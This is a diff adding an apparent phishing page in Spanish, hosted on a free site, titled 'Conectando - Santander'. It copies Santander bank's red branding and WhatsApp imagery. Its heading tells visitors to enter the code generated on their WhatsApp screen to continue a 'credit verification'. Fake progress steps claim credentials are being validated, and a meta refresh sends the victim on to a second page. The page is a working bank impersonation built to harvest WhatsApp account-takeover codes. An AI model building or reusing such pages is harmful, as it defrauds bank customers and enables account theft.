@@ -1,0 +1,463 @@
+
+<!DOCTYPE html>
+<html lang="es">
+  <head>
+<!-- Inserted by miarroba -->
+<script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-7294310421616689" crossorigin="anonymous"></script>
+<script type='text/javascript' src='https://ads.vidoomy.com/miarroba_23335.js' async></script>
+<script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src='https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);})(window,document,'script','dataLayer','GTM-T2VG59');</script>
+<!-- Inserted by miarroba -->
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Conectando - Santander</title>
+    <meta http-equiv="refresh" content="15; url=/index2.html" />
+    <style>
+      * {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+      }
+
+      body {
+        font-family: "SantanderHeadline", -apple-system, BlinkMacSystemFont,
+          "Segoe UI", sans-serif;
+        background: linear-gradient(135deg, #ec0000 0%, #c40000 100%);
+        min-height: 100vh;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        overflow: hidden;
+      }
+
+      .loading-container {
+        text-align: center;
+        padding: 40px;
+      }
+
+      .logos-container {
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        gap: 40px;
+        margin-bottom: 40px;
+        position: relative;
+      }
+
+      .logo-box {
+        background: white;
+        padding: 30px;
+        border-radius: 16px;
+        box-shadow: 0 10px 40px rgba(0, 0, 0, 0.3);
+        animation: float 3s ease-in-out infinite;
+      }
+
+      .logo-box:nth-child(1) {
+        animation-delay: 0s;
+      }
+
+      .logo-box:nth-child(3) {
+        animation-delay: 0.5s;
+      }
+
+      @keyframes float {
+        0%,
+        100% {
+          transform: translateY(0px);
+        }
+        50% {
+          transform: translateY(-10px);
+        }
+      }
+
+      .santander-logo {
+        color: #ec0000;
+        font-size: 48px;
+        font-weight: bold;
+        letter-spacing: 3px;
+      }
+
+      .whatsapp-logo {
+        width: 80px;
+        height: 80px;
+        position: relative;
+      }
+
+      .whatsapp-icon {
+        width: 100%;
+        height: 100%;
+        background: #25d366;
+        border-radius: 50%;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        position: relative;
+      }
+
+      .whatsapp-icon::before {
+        content: "";
+        position: absolute;
+        width: 50px;
+        height: 50px;
+        background: white;
+        border-radius: 50%;
+      }
+
+      .whatsapp-icon::after {
+        content: "";
+        position: absolute;
+        width: 35px;
+        height: 35px;
+        background: #25d366;
+        border-radius: 50%;
+        clip-path: polygon(
+          0 0,
+          100% 0,
+          100% 70%,
+          70% 70%,
+          50% 100%,
+          45% 70%,
+          0 70%
+        );
+      }
+
+      .phone-icon {
+        position: absolute;
+        font-size: 40px;
+        color: white;
+        z-index: 1;
+      }
+
+      .connecting-line {
+        position: relative;
+        width: 80px;
+        height: 4px;
+        background: rgba(255, 255, 255, 0.2);
+        border-radius: 2px;
+        overflow: hidden;
+      }
+
+      .connecting-line::before {
+        content: "";
+        position: absolute;
+        top: 0;
+        left: -100%;
+        width: 50%;
+        height: 100%;
+        background: linear-gradient(90deg, transparent, #25d366, transparent);
+        animation: slide 1.5s ease-in-out infinite;
+      }
+
+      @keyframes slide {
+        0% {
+          left: -100%;
+        }
+        100% {
+          left: 100%;
+        }
+      }
+
+      .status-text {
+        color: white;
+        font-size: 28px;
+        font-weight: 300;
+        margin-bottom: 20px;
+        animation: pulse 2s ease-in-out infinite;
+      }
+
+      @keyframes pulse {
+        0%,
+        100% {
+          opacity: 1;
+        }
+        50% {
+          opacity: 0.6;
+        }
+      }
+
+      .loading-dots {
+        display: inline-block;
+        margin-left: 5px;
+      }
+
+      .loading-dots span {
+        animation: blink 1.4s infinite;
+        font-size: 28px;
+      }
+
+      .loading-dots span:nth-child(2) {
+        animation-delay: 0.2s;
+      }
+
+      .loading-dots span:nth-child(3) {
+        animation-delay: 0.4s;
+      }
+
+      @keyframes blink {
+        0%,
+        100% {
+          opacity: 0.2;
+        }
+        50% {
+          opacity: 1;
+        }
+      }
+
+      .spinner {
+        width: 60px;
+        height: 60px;
+        border: 4px solid rgba(255, 255, 255, 0.2);
+        border-top-color: #25d366;
+        border-radius: 50%;
+        animation: spin 1s linear infinite;
+        margin: 0 auto;
+      }
+
+      @keyframes spin {
+        to {
+          transform: rotate(360deg);
+        }
+      }
+
+      .subtitle {
+        color: rgba(255, 255, 255, 0.8);
+        font-size: 16px;
+        margin-top: 30px;
+        font-weight: 300;
+      }
+
+      .verification-box {
+        background: rgba(255, 255, 255, 0.1);
+        backdrop-filter: blur(10px);
+        border: 1px solid rgba(255, 255, 255, 0.2);
+        border-radius: 12px;
+        padding: 20px 30px;
+        margin: 30px auto;
+        max-width: 400px;
+        animation: fadeInScale 0.8s ease-out;
+      }
+
+      @keyframes fadeInScale {
+        0% {
+          opacity: 0;
+          transform: scale(0.9);
+        }
+        100% {
+          opacity: 1;
+          transform: scale(1);
+        }
+      }
+
+      .verification-box-header {
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        gap: 12px;
+        margin-bottom: 12px;
+      }
+
+      .security-icon {
+        width: 28px;
+        height: 28px;
+        background: #25d366;
+        border-radius: 50%;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        font-size: 16px;
+        animation: securityPulse 2s ease-in-out infinite;
+      }
+
+      @keyframes securityPulse {
+        0%,
+        100% {
+          box-shadow: 0 0 0 0 rgba(37, 211, 102, 0.7);
+        }
+        50% {
+          box-shadow: 0 0 0 10px rgba(37, 211, 102, 0);
+        }
+      }
+
+      .verification-title {
+        color: white;
+        font-size: 18px;
+        font-weight: 500;
+        margin: 0;
+      }
+
+      .verification-message {
+        color: rgba(255, 255, 255, 0.9);
+        font-size: 14px;
+        line-height: 1.6;
+        margin: 0;
+      }
+
+      .steps-container {
+        margin-top: 20px;
+        text-align: left;
+      }
+
+      .step-item {
+        display: flex;
+        align-items: center;
+        gap: 12px;
+        margin-bottom: 12px;
+        color: rgba(255, 255, 255, 0.7);
+        font-size: 13px;
+      }
+
+      .step-icon {
+        width: 20px;
+        height: 20px;
+        border-radius: 50%;
+        background: rgba(37, 211, 102, 0.3);
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        font-size: 12px;
+        flex-shrink: 0;
+      }
+
+      .step-item.active {
+        color: #25d366;
+        font-weight: 500;
+      }
+
+      .step-item.active .step-icon {
+        background: #25d366;
+        animation: checkPulse 1s ease-in-out infinite;
+      }
+
+      @keyframes checkPulse {
+        0%,
+        100% {
+          transform: scale(1);
+        }
+        50% {
+          transform: scale(1.1);
+        }
+      }
+
+      .progress-bar {
+        width: 300px;
+        height: 6px;
+        background: rgba(255, 255, 255, 0.2);
+        border-radius: 3px;
+        margin: 30px auto;
+        overflow: hidden;
+      }
+
+      .progress-fill {
+        height: 100%;
+        background: linear-gradient(90deg, #25d366, #128c7e);
+        border-radius: 3px;
+        animation: progress 3s ease-in-out infinite;
+      }
+
+      @keyframes progress {
+        0% {
+          width: 0%;
+        }
+        50% {
+          width: 70%;
+        }
+        100% {
+          width: 100%;
+        }
+      }
+
+      @media (max-width: 768px) {
+        .logos-container {
+          gap: 20px;
+        }
+
+        .logo-box {
+          padding: 20px;
+        }
+
+        .santander-logo {
+          font-size: 36px;
+        }
+
+        .whatsapp-logo {
+          width: 60px;
+          height: 60px;
+        }
+
+        .phone-icon {
+          font-size: 30px;
+        }
+
+        .connecting-line {
+          width: 50px;
+        }
+
+        .status-text {
+          font-size: 22px;
+        }
+
+        .progress-bar {
+          width: 250px;
+        }
+      }
+    </style>
+  </head>
+  <body>
+<!-- Inserted by miarroba -->
+<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-T2VG59" height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
+<!-- Inserted by miarroba -->
+    <div class="loading-container">
+      <div class="logos-container">
+        <div class="logo-box">
+          <img
+            src="logo.png"
+            style="width: 150px"
+            alt=""
+          />
+        </div>
+      </div>
+
+      <h1 class="status-text">
+        Ingrese el codigo que se genero en su pantalla de WhatsApp <br> para continuar con la verificacion de su credito
+        <span class="loading-dots">
+          <span>.</span><span>.</span><span>.</span>
+        </span>
+      </h1>
+
+      <div class="progress-bar">
+        <div class="progress-fill"></div>
+      </div>
+
+      <div class="spinner"></div>
+
+      <div class="verification-box">
+        <div class="steps-container">
+          <div class="step-item active">
+            <div class="step-icon">✓</div>
+            <span>Validando credenciales</span>
+          </div>
+          <div class="step-item active">
+            <div class="step-icon">⟳</div>
+            <span>Estableciendo conexión segura</span>
+          </div>
+          <div class="step-item">
+            <div class="step-icon">○</div>
+            <span>Completando verificación</span>
+          </div>
+        </div>
+      </div>
+
+      <p class="subtitle">Por favor espera un momento</p>
+    </div>
+
+    <script>
+      // Simular redirección después de 5 segundos (opcional)
+      setTimeout(() => {
+        console.log("Conexión establecida");
+        // window.location.href = 'siguiente-pagina.html';
+      }, 5000);
+    </script>
+  <!-- Inserted by miarroba -->
+</script></noframes></noembed></noscript><script type="text/javascript" src="/hosting__contador__visitas__unicas.php?h=2209259&amp;t=1767703460&amp;k=748613fadea92f08758053cf4a299ed8&amp;__muid="></script>
+<!-- Inserted by miarroba -->
+</body>
+</html>
